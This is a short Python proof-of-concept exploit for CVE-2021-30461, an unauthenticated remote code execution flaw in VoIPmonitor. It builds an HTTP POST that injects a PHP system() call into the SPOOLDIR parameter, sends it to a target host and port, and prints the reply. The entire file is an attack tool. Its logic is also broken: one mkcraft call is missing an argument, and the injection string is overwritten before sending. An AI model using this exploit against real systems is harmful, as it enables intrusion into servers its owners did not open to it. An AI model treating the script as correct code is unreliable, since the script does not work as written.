#!/usr/bin/env python3
# CVE-2021-30461: VoIPmonitor UnAuth RCE POC
# Author Dario Clavijo 2021
import socket
import sys

def mkcraft(cmd,host):
  """ Craft the malicious request """
  header = """POST /index.php HTTP/1.1
Host: %s
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: Close
Accept-Language: en-US,en;q=0.5
Content-type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: %d

SPOOLDIR=%s""".replace("\n","\r\n")

  cmd = cmd.replace('"',"%22").replace("(","%28").replace(")","%29").replace(" ","%20")
  return header % (host,len(cmd),cmd)


def main():
    cmd = 'id'
    crafted = mkcraft('test".system(%s)"' % cmd)
    HOST,PORT = sys.argv[1].split(":")
    HOST,PORT = HOST,int(PORT)
    crafted = mkcraft(cmd,HOST)


    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        print('Connected by', HOST)
        s.send(crafted.encode("utf-8"))
        print("Sent:")
        print(crafted)
        while True:
            print("Recv:")
            data = s.recv(512).decode("utf-8")
            print(data)
            if not data:
               break


if __name__ == "__main__":
    main()
